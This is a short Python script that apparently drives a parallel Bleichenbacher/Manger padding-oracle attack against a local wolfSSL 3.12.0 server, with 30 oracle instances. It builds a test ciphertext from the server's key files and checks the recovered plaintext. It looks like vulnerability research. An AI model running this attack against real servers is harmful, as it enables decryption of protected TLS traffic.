from Crypto.PublicKey import RSA
from gmpy2 import gmpy2

from bleich_parallel_attack import BleichParallelAttack
from bleichenbacher_oracle import get_public_constants, MangerOracle


class PublicKey(object):
    def __init__(self, e, n):
        self.e = e
        self.n = n
        self.p = None
        self.q = None


if __name__ == "__main__":

    server_port = 11111
    path_to_server_public_key = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/server-public-key.pem"
    public_constants = get_public_constants(path_to_server_public_key)
    modulus_bytes = public_constants["modulus_bytes"]
    pub_key = PublicKey(public_constants["e"], public_constants["N"])
    path_to_cert = "/home/lubuntu/wolfssl-3.12.0-stable/certificates/server-private-key.pem"
    with open(path_to_cert, "r") as cert:
        key = RSA.importKey(cert.read())

    oracles = list()
    for i in range(30):
        oracles.append(MangerOracle(server_port + i, public_constants))
    rnd_pad = public_constants["rnd_pad"]
    message = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
    c = int("0002" + rnd_pad + "00" + "0303" + message, 16)
    c = int(gmpy2.powmod(c, key.e, key.n)).to_bytes(modulus_bytes, byteorder="big")
    parallel_bleich_attack = BleichParallelAttack(modulus_bytes, pub_key, c, oracles)

    result = parallel_bleich_attack.run()
    print(result.to_bytes(modulus_bytes, 'big'))
    if pow(result, key.e, key.n) == int.from_bytes(c, byteorder='big'):
        print("right result")
    else:
        print("wrong result")
